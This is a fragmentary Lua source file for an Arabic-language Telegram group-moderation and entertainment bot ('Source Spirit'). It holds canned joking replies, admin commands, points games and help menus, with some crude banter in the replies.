send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نعم الله عليك..🌚❤️](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..😒♥️](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[العفو ياروحي..🌚❤️](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..🌚♥️](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اي ثقافه دي 😹](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[موت بعيد م ناقصين مصايب😑😂](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[جتك اوهه م سامع ولا ايي😹👻](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[فرح خالتك قريب😹💋💃🏻](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[حضرلك الخير يارب..🙂](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[لف ورجع تانى مشحوار 😂🚶‍♂👻](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[يوه خضتني ياسمك اي..🥺💔](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اوه ياه..🌝😂](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[امك اسمها احلام..😹😹](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك ❤️😂](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝❤️](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خلصتت روحكك يبعيد😹💔](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بتفكر في اي..🤔](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[وانا كمان بعشقك يا روحي 💋🥰](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[محات حياتي يروحي..🌚💔](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[القمر ده شبهك..🙂♥️](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[هلا بيك ياروحي..💛](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ بنهش كتاكيت احنا هنا ولا اي..🐣😹](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[دايما ياحبيبي..🌚💜](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفهسبريت](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف..🥺💔](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الخير يعمري..🌚❤️](t.me/come_here_to_get)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص..😂😜](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق..🥰❤️](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام..🌚🖤](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال..😹](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اه اي يا قدع عيب 😹💔](t.me/come_here_to_get)')
return false
end
if text then 
list = {'كسم'}
...
send(msg.chat_id_,msg.id_, '[عيب ياوسخ..🙄💔](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نعم يا مطوري..🥺💔](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح..😹👻](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح..😹👻](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اعدل وشك ونت بتكلمني 😒](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صح النوم..😂](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صباح العسل 🍯🙂](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ده نورك ي قلبي..🙂💛](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى🥺💔](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..🥺❤️](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نورك يا قلبي..🌚❤️](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه..😹💥](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اهدا يوحش ميصحش كدا..😂](t.me/come_here_to_get)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚❤️](t.me/come_here_to_get)')
return false
end
end
end
...
first_name = ' ꨄ︎ اسمك الاول  ⇇ {`'..(result.first_name_)..'`}'
else
first_name = ''
end   
if result.last_name_ then 
last_name = ' ꨄ︎ اسمك الثاني  ⇇ {`'..result.last_name_..'`}' 
else
last_name = ''
end      
...
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,' ꨄ︎ ايديك  ⇇ '..msg.sender_user_id_)
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ الايدي غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
...
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_," ꨄ︎ البوت ليس ادمن \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local sofi = ' ꨄ︎ عدد الادمنيه : '..data.administrator_count_..
'\n\n ꨄ︎ عدد المطرودين : '..data.kicked_count_..
'\n\n ꨄ︎ عدد الاعضاء : '..data.member_count_..
'\n\n ꨄ︎ عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
'\n\n ꨄ︎  اسم الجروب : ['..ta.title_..']'
...
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا استطيع طرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,' ꨄ︎ لا استطيع اصيح معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,' ꨄ︎ لا استطيع اصيح معرف بوتات') 
return false  
end
...
if result.id_ then
send(msg.chat_id_, msg.id_,' ꨄ︎ 😾تع يعم كلم الود دا قرفني [@↝'..username..'↜]') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعطيل امر صيح') 
end
return false
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ انت منشئ الجروب') 
return false
end
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' ꨄ︎ هوا ابن القمر دا الي ضافك😹 ⇇'..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' ꨄ︎ انت دخلت عبر الرابط يوسخ 🌝') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعطيل امر  مين ضافني') 
end
end
...
Text = ' ꨄ︎ تم تفعيل امر مين ضافني '
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = ' ꨄ︎ بالتاكيد تم تفعيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n ꨄ︎ تم تعطيل امر مين ضافني '
else
Text = '\n ꨄ︎ بالتاكيد تم تعطيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = ' ꨄ︎ تم تفعيل امر صيح'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = ' ꨄ︎ بالتاكيد تم تفعيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n ꨄ︎ بالتاكيد تم تعطيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = ' ꨄ︎ تم تفعيل امر اطردني إلى عايز يخرج يتنيل 😹'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' ꨄ︎ بالتاكيد تم تفعيل امر اطردني مخلاص كفايه تفعيل الأمر 😾'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n ꨄ︎ تم تعطيل امر اطردني اترزع هن بقى مفيش خروج 😹'
else
Text = '\n ꨄ︎ بالتاكيد تم تعطيل امر اطردني مفيش خروج يولاد القمر 😹'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
...
if not my_ph then
send(msg.chat_id_, msg.id_," ꨄ︎ الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ꨄ︎ عدد صورك ⇜ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
...
if not my_ph then
send(msg.chat_id_, msg.id_," ꨄ︎ اكتب تفعيل نسبه جمالي") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ꨄ︎ نسبه جمالك هيا ⇜ %"..result.total_count_.." يختي قمر يجدعان ꨄ︎ 💕", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
...
send(msg.chat_id_, msg.id_, '\n ꨄ︎ الصوره ⇜ ليس لديك صور في حسابك'..'[\n|• 𝒖𝒔𝒆𝒓 → ↝'..username..'↜\n|• 𝒎𝒔𝒈𝒔→ ↝'..Msguser..'↜\n|• 𝒊𝒅 →  ↝'..msg.sender_user_id_..'↜\n|• 𝒄𝒉→  ↝@A_F_fwdka1 ↜\n')
end 
end
end
else
...
[[
🌨⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺Use ⇨ #username ??
🌨⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺iD ⇨ #id 🌨
🌨⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺Sta ⇨  #stast 🌨
🌨⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺Msg ⇨ #msgs 🌨
🌨⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ꨄ︎  
↑⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺𝙄𝘿 ➱ #id
↑⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺𝙍𝘼𝙉𝙆 ➱  #stast ꨄ︎  
↑⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺??𝘼𝙎𝙂 ➱ #msgs ꨄ︎  
↑⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺𝗖𝗛 ➯  ↝@come_here_to_get↜ ꨄ︎  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تغير الايدي ارسل ايدي لرؤيته')
end

if text == 'سحكاتي' or text == 'تعديلاتي' then 
local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
if Num == 0 then 
Text = ' ꨄ︎  ليس لديك سحكات'
else
Text = ' ꨄ︎ عدد سحكاتك * ⇇↝ '..Num..' ↜ *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" or text == "مسح سحكاتي" then  
send(msg.chat_id_, msg.id_,' ꨄ︎ تم مسح سحكاتك'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "مسح جهاتي" then  
send(msg.chat_id_, msg.id_,' ꨄ︎ تم مسح جهاتك'  )  
...
if Num == 0 then 
Text = ' ꨄ︎ لم تقم بأضافه احد'
else
Text = ' ꨄ︎ عدد جهاتك يبشا * ⇇↝ '..Num..' ↜ *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
-- vardump(data) 
DRAGONdx(msg.chat_id_, msg.id_, ' ꨄ︎ ايدي المجموعة  ⇇↝ '..msg.chat_id_..' ↜\n ꨄ︎ عدد الادمنيه  ⇇↝ *'..data.administrator_count_..' ↜*\n ꨄ︎ عدد المحظورين  ⇇↝ *'..data.kicked_count_..' ↜*\n ꨄ︎ عدد الاعضاء  ⇇↝ *'..data.member_count_..' ↜*\n', 'md') 
end 
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم اضافة له {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,  1, " ꨄ︎ | تم اضافة له {"..numadded..'} من النقود', 1 , 'md')  
end
------------------------------------------------------------
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ ارسل لي عدد الرسائل الان') 
return false
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ ارسل لي عدد النقاط التي تريد اضافتها') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم اضافة له {"..Num..'} من النقاط')  
end
...
if Num == 0 then 
Text = ' ꨄ︎ لم تلعب اي لعبه للحصول على نقاط'
else
Text = ' ꨄ︎ عدد نقاطك التي ربحتها هيه * ⇇↝ '..Num..' ↜ نقاط *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_,msg.id_,"\n* ꨄ︎ لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,' ꨄ︎ ليس لديك نقاط في الالعاب\n ꨄ︎ اذا كنت تريد ربح نقاط \n ꨄ︎ ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n ꨄ︎ ليس لديك نقاط في هذه لعبه \n ꨄ︎ لزيادة نقاطك في اللعبه \n ꨄ︎ ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,' ꨄ︎ تم خصم * ⇇{ '..NUMPY..' }* من نقاطك \n ꨄ︎ وتم اضافة*  ⇇{ '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end
...
send(msg.chat_id_,msg.id_,'\n ꨄ︎ اهلا عزيزي البوت هنا ادمن'..'\n ꨄ︎ وصلاحياته هي ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺ \n━━━━━━━━━━'..'\n ꨄ︎ تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n ꨄ︎ مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n ꨄ︎ حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n ꨄ︎ دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n ꨄ︎ تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n ꨄ︎ اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم تغير رد المطور الى  ⇇"..Teext)
end
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم حفظ الكليشه')
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم استعادة الاوامر القديمه')
end
if text == 'تغير امر الاوامر' and DevSoFi(msg) then
send(msg.chat_id_, msg.id_, ' ꨄ︎ الان يمكنك ارسال الكليشه الاوامر')
database:set(bot_id..'help'..msg.sender_user_id_,'true')
return false 
end
if text == 'تغير امر ⓵' and DevSoFi(msg) then
send(msg.chat_id_, msg.id_, ' ꨄ︎ الان يمكنك ارسال الكليشه ⓵')
...
if not Mod(msg) then
send(msg.chat_id_, msg.id_,' ꨄ︎ هاذا الامر خاص بالادمنيه\n ꨄ︎ ارسل {⑩} لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
[🎯ألعابسورس سبريت الاحسن في التليجرام ⇈⇊]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´](t.me/come_here_to_get)
]]
keyboard = {} 
...
local Text = [[
 ...
 تحت لي في الزر الأسفل⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تعطيل حساب العمر')
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تفعيل حساب العمر')
database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"open")
end
if text == "تعطيل الاله حاسبه" and Manager(msg) then
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تعطيل الاله حاسبه')
database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل الاله حاسبه" and Manager(msg) then
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تعطيل الاله حاسبه')
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تفعيل الاله حاسبه')
database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"open")
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ تـم تـفعـيل مريم") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ تـم تـعـطـيل مريم") 
return false end
end
if text == "مريم" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," ꨄ︎ مريم  معطله") 
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
...
local Text = [[
𓆩 مواقع حذف جميع حسابات المديا 𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
{{text = '𓆩 𝐂𝐇 𓆪', url="t.me/come_here_to_get"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if Text == '/devsoo' then
local Teext =[[
𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ ᴍᴀᴅɪsᴏɴ ♪',url="t.me/AAHMEED11"},{text = 'ᴅᴇᴠ sᴘɪʀɪᴛ ♪', url="t.me/spiritc1"}},
{{text = '`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´',url="t.me/come_here_to_get"}},
}
...
𓆩 ❲ الادمن❳ 𓆪
 ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺
𓆩 رفع مميز ⇔ تنزيل مميز 𓆪
𓆩 الترحيب 𓆪
𓆩 اضف مغادره ⇔ مسح المغادره 𓆪
𓆩 رساله المغادره 𓆪
𓆩 كشف البوتات 𓆪
𓆩 المميزين ⇔ مسح المميزين 𓆪
𓆩 حظر ⇔ الغاء حظر 𓆪
𓆩 كتم ⇔ الغاء كتم 𓆪
𓆩 حظر لمده + المده 𓆪
𓆩 كتم لمده + المده 𓆪
𓆩 طرد ⇔ تسبريتير  𓆪
𓆩 تثبيت ⇔ تثبيت بدون اشعار 𓆪
𓆩 الغاء تثبيت الكل 𓆪
𓆩  ❲ + ❳ جميع ماسبق 𓆪
 ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺
𓆩 ❲ المنشئ❳ 𓆪
 ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺
𓆩  رفع ⇔ تنزيل ادمن 𓆪
𓆩 اضف ⇔ مسح  ❲ رد ❳ 𓆪
𓆩 الردود ⇔ مسح الردود 𓆪
𓆩 ايقاف المنشن 𓆪
𓆩 تعيين ⇔ مسح  ❲ الايدي ❳ 𓆪
𓆩 الادمنيه ⇔ مسح الادمنيه 𓆪
𓆩 اضف ترحيب 𓆪
𓆩  مسح المحظورين ⇔ المكتومين 𓆪
𓆩 منع + الكلمه 𓆪
𓆩 الغاء منع + الكلمه ??
𓆩  مسح الكلمات الممنوعه 𓆪
𓆩 المميزين عام 𓆪
𓆩  ❲ + ❳ جميع ماسبق 𓆪
 ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺
𓆩 ❲ المالك❳ 𓆪
 ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺
𓆩 اضف صوره ⇔ وصف (للجروب) 𓆪
𓆩 رفع منشئ ⇔ تنزيل منشئ 𓆪
𓆩 تاج للاعضاء ⇔ للكل 𓆪
𓆩 اضف رابط ⇔ مسح الرابط 𓆪
𓆩 اضف ⇔ مسح  ❲ امر ❳ 𓆪
𓆩 الاوامر المضافه 𓆪
𓆩  مسح الاوامر المضافه 𓆪
𓆩 ضع اسم + الاسم ⇔ تحديث 𓆪
𓆩 المنشئين ⇔ مسح المنشئين 𓆪
𓆩  ❲ + ❳ جميع ماسبق 𓆪
 ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺
...
𓆩 مسح الاساسين 𓆪
𓆩 المنشئين الاساسين 𓆪
𓆩 مسح المنشئين ⇇ المنشئين 𓆪
𓆩 اسم ~ ايدي + بوت غادر 𓆪
⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺
𓆩 المطور الاساسي+ المطور الثانوي 𓆪
⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺
𓆩 تفعيل 𓆪
𓆩 تعطيل 𓆪
𓆩 مسح الاساسين 𓆪
...
𓆩 تفعيل/تعطيل البوت الخدمي 𓆪
𓆩 تفعيل/تعطيل التواصل 𓆪
𓆩 تغير اسم البوت 𓆪
𓆩 اضف/مسح رد عام 𓆪
𓆩 الردود العامه 𓆪
𓆩 مسح الردود العامه 𓆪
𓆩 الاشتراك الاجباري 𓆪
𓆩 تعطيل الاشتراك الاجباري 𓆪
𓆩 تفعيل الاشتراك الاجباري 𓆪
𓆩 مسح رساله الاشتراك 𓆪
𓆩 تغير رساله الاشتراك 𓆪
𓆩 تغير الاشتراك 
𓆩 الاحصائيات 𓆪
𓆩 المشتركين 𓆪
𓆩 المجموعات 𓆪
...
------------------
🛡╖ ❬ 1 ❭ Orders Protect Group ꨄ︎ 
🧸╢ ❬ 2 ❭ entertainment orders ꨄ︎ 
🎎╢ ❬ 3 ❭ Orders of members ꨄ︎ 
✅╢ ❬ 4 ❭ orders of arrangers ꨄ︎ 
🌐╜ ❬ 5 ❭ Orders of developers ꨄ︎ 
------------------
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Protect Group ꨄ︎ ', callback_data="/help4"},{text = 'entertainment orders ꨄ︎ ', callback_data="/hiddnt"},
},
{
{text = 'Orders of members ꨄ︎ ', callback_data="/help3"},
},
{
{text = 'orders of arrangers ꨄ︎ ', callback_data="/help9"},{text = 'Orders of developers ꨄ︎ ', callback_data="/hle55"},
},
{
{text = '𓆩 تــغــير الــلــغــه 𓆪', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
if Text == '/sofi' then
local Teext =[[
𓆩 اهلا في قائمه الالعاب المتطوره سورس سبريت 𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
...
keyboard.inline_keyboard = {
{
{text = '𓆩 لقائمه الرائسيه 𓆪', callback_data="/change-id"},
},
{
{text = '`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´', url="t.me/come_here_to_get"},
},
...
local Teext =[[
𓆩 مرحبا بك في الالعاب المضافه حديثا 𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم مسح الامر')  
else
send(msg.chat_id_, msg.id_,' ꨄ︎ لا يوجد امر بهاذا الاسم')  
end
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم تعطيل اوامر التسليه')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, ' ꨄ︎  تم تفعيل اوامر التسليه')
database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
end
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'راستي')
...
"‏صراحه  |  من هو الشخص الذي يأتي في قلبك بعد الله – سبحانه وتعالى- ورسوله السبريت– صلى الله عليه وسلم؟",
...
send(msg.chat_id_,0,''..t..'\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ تم التعديل على الميديا\n ꨄ︎ الشخص الي قام بالتعديل\n ꨄ︎ ايدي الشخص ◂ '..result.sender_user_id_..'\n ꨄ︎ معرف الشخص ↚{ '..users..' }') 
end,nil)
...
if DRAGON1_Msg then    
send(msg.chat_id_, msg.id_," ꨄ︎< "..DRAGON1_Msg)
